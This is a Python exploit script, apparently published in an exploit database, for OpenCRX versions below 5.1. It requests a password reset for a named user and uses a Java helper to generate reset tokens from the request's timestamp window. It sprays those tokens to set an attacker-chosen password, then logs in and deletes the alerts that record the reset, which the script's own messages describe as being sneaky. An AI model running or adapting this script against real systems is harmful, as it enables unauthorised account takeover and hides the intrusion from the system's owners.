# Exploit Title: OpenCRX Password Reseter
# Date: 2021-07-19
# Exploit Author: Youssef B
# Tested against: OpenCRX < 5.1

#!/usr/bin/python3

import requests, argparse, os.path, subprocess, time, re, random, string, urllib3
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', help='Username to deceive', required=True)
parser.add_argument('-p', '--password', help='Password value to set', required=True)
parser.add_argument('-f', '--jfile', help='Specify the java program for tokens file building', required=True)
parser.add_argument('-t', '--target', help='Specify a valid target url', required=True)
args = parser.parse_args()

target = args.target
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

def hsession():
    s = requests.Session()
    return s

s = hsession()

def reqpassreset(t):
    smillisec = int(time.time() * 1000)

    target = t + 'RequestPasswordReset.jsp'
    data = 'id=%s' % args.user    

    try:
        res = s.post(target, headers=headers, data=data, verify=False)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something went wrong!!!",err)
        exit(1)
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
        exit(1)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
        exit(1)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
        exit(1)
    
    if "Password reset request successful for %s" % args.user in res.text:
        emillisec = int(time.time() * 1000)
        print("Reset token request successful")
        return smillisec, emillisec
    else:
        print(f"Failed to request reset token for " + args.user + ". Maybe none vulnerable target.")
        exit(1)

def login(t):
    data    = 'j_username=%s&j_password=%s' % (args.user, args.password)
    posturl = t + 'j_security_check'
    geturl  = t + 'ObjectInspectorServlet'

    s.get(geturl)
    con = s.post(posturl, headers=headers, data=data, allow_redirects=True, verify=False)

    html    = con.content.decode('utf-8')
    regid   = r".*requestId=(.*)&event.*?"
    evgid   = r".*event=(\d*)&parameter"
    reqid   = re.findall(regid, html)
    evtid   = re.findall(evgid, html)
    strid   = ""
    reqid   = strid.join(reqid)
    evtid   = strid.join(evtid)

    params = (
    ('requestId', reqid),
    ('event', evtid),
    ('parameter', 'xri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard)')
    )

    response    = s.get(geturl, params=params, verify=False)
    referer     = response.url

    return s, reqid, referer

def random_string(length):
    return ''.join(random.sample(string.ascii_letters + string.digits, length))

def deleteproof(t):
    s, reqid, referer   = login(t)
    target              = t + 'ObjectInspectorServlet'
    paramreg            = r".*/alert/(.*)\)\*"

    params = (
        ('requestId', reqid),
        ('event', '15'),
        ('parameter', 'pane*(0)*reference*(0)*referenceName*(alert)')
    )

    getparam   = s.get(target, headers=headers.update({'referer': referer}), params=params, verify=False)
    html        = getparam.content.decode('utf-8')
    parid       = re.findall(paramreg, html)[0]
    parstr      = ""
    parid       = parstr.join(parid)
    paramlist   = "xri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard/alert/%s)" % parid

    payload             = {'requestId.submit': reqid, 'event.submit': '28', 'parameter.list': paramlist}
    boundary            = "----WebKitFormBoundary" + random_string(16)
    m                   = MultipartEncoder(fields=payload, boundary=boundary)

    head = {
        'referer': referer,
        'Content-Type': m.content_type
    }

    if (s.post(target, headers=head, data=m, verify=False)):
        print("Alerts successfuly deleted. Login to the target and check it dude ;)")
    else:
        print("Seems that alerts have not been deleted...")
    
    return s

def createfile(cmd):
    with open('tokens.txt', 'a+') as f:
        subprocess.call(cmd.split(), stdout=f, stderr=subprocess.DEVNULL)
        print(f"Successfully wrote file: " + f.name)
        return os.path.basename(f.name)

def javaexec(java_file):
    sdate, edate = reqpassreset(target)

    print("Building tokens file. Please wait...")

    java_file = args.jfile
    java_class = os.path.splitext(java_file)[0]
    cmd = 'java %s %s %s' % (java_class, sdate, edate)

    if os.path.exists("tokens.txt"):
        print("Removing existing tokens.txt file")
        os.remove("tokens.txt")
        return createfile(cmd)
    else:
        return createfile(cmd)

def passresconfirm(t):    
    tokens = javaexec(args.jfile)

    print("Starting token spray. Stand by...")

    with open(tokens, "r") as f:
        for word in f:
            # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
            payload = {'t':word.strip(),'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

            r = s.post(url=t + "PasswordResetConfirm.jsp", data=payload)
            res = r.text

            if "Unable to reset password" not in res:
                print("Successful reset with token: %s" % word)
                print("Please wait while we are deleting alerts... Be sneaky my friend. Be sneaky...")
                break


if __name__ == '__main__':
    passresconfirm(target)
    deleteproof(target)
